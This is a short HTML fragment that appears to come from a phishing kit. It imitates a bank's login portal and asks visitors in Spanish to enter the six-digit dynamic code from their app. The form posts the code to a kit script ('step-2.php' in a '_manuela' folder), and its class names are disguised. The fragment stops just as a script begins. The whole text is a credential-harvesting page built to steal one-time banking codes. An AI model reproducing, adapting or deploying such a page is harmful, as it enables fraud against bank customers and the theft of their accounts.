    ...
    <div class="row">
      <div class="col">
        ...
        <form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
          name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="../_manuela/step-2.php"
          enctype="application/x-www-form-urlencoded">


          <div class="grotesca-title">Valide su Clave dinamica</div>
          <div class="caminolimpio">
            <div class="message">Para continuar con la verificación debe ingresar la Clave Dinámica que encuentras en la app (Código de 6 dígitos).</div>
            ...
            <div class="input-container">
              <img src="../_manuela/img/lock.png" alt="Input Icon" class="input-icon">

              <input type="number" class="camionescolombia" id="inputLimitado" name="txtOTP" placeholder="" maxlength="6">
...
<script>
  const input = document.getElementById('inputLimitado');
